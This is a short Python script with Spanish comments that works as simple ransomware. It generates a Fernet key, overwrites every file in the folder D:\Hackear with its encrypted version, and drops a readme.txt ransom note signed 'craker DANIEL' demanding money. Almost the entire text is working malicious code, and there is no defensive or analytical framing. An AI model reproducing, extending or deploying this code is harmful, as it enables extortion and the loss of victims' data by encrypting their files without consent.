from cryptography.fernet import Fernet
import os

def generar_key():#con esto generas una cable 
    key=Fernet.generate_key()#genera la clave
    with open('key.key','wb')as key_files:
        key_files.write(key)

def cargar_key():#con esto pienso que se abre la llave 
    return open('key.key','rb').read()


def encrypt(items,key):#ahora esto va la inciptacion nota que usa un bucle for para encriptar esto 
    f=Fernet(key)
    for item in items:
        with open(item,'rb') as file:
            file_data=file.read()
        encrypted_data= f.encrypt(file_data)#ecnripta todo lo que hay en la carpeta
        with open(item,'wb') as file:
            file.write(encrypted_data)
if __name__=='__main__':#ejecutar funciones correctamente
    path_to_encrypt='D:\Hackear'
    items=os.listdir(path_to_encrypt)#para ver lo que hay en el archivo
    full_path=[path_to_encrypt+'\\'+item for item in items ]#lista por compresion con un bucle for


    generar_key()
    key= cargar_key()

    encrypt(full_path,key)#cone sto siframos 

    with open(path_to_encrypt+'\\'+'readme.txt','w') as file:#esto hace los archivos para que otros lo lean para esto sirve
        file.write('fichero encriptado por el craker DANIEL \n')
        file.write('Dame dinero pedaso de flaco')

#mucho cuidado con todos los archivos para que no puedas generar varias veces desecpricinoes